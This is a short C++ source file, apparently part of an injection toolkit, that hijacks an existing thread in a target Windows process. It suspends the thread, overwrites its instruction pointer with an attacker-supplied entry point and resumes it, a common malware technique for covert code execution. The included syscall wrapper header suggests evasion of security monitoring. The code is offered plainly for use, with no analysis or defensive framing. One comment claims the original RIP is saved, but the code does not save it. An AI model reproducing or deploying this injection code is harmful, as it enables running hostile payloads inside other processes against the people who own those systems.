#include "InjectionManager.h"
#include "SyscallWrapper.h"
#include <tlhelp32.h>

bool HijackExistingThread(HANDLE hProcess, PVOID pEntryPoint) {
    DWORD threadId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD currentPid = GetProcessId(hProcess);

    // 1. Encontrar un hilo que pertenezca al proceso objetivo
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == currentPid) {
                threadId = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);

    if (threadId == 0) return false;

    // 2. Abrir el hilo y suspenderlo temporalmente
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    SuspendThread(hThread);

    // 3. Obtener y modificar el contexto (RIP/EIP)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(hThread, &ctx);

    // Guardamos el RIP original para volver a él después (evita crasheos)
    // ctx.Rip es la dirección donde el hilo iba a ejecutar la siguiente instrucción
    ctx.Rip = (DWORD64)pEntryPoint; 

    // 4. Aplicar el nuevo contexto y reanudar
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    CloseHandle(hThread);
    return true;
}